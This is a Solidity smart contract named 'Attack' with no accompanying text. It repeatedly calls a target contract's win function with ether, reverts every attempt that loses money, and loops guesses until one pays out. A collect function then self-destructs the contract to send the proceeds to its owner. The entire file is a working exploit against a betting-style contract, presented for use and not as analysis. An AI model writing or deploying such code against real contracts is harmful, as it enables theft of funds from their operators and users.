
contract Attack {
    address adr_ins;
    address owner;
    
    constructor(address addr){
        adr_ins = addr;
        owner = msg.sender;
    }
    

    function getBalance(address addr) public view returns (uint){
        return address(addr).balance;
    }
    
    function intra(uint256 i) public payable{
        uint256 beforeBalance = this.balance;
        adr_ins.call.value(msg.value)(bytes4(sha3("win(uint256)")), i);
        if (this.balance < beforeBalance)
            revert();
    }    
    
    function hack() public payable{
        require (msg.value >= 1 ether);
        for (uint256 i = 0; i < 100;++i)
        {
            if (this.call.value(msg.value)(bytes4(sha3("intra(uint256)")), i%10))
                break;
        }
    }
    
    function collect() payable public{
        require(msg.sender == owner);
        selfdestruct(owner);
    }
    function () payable{
    }
}
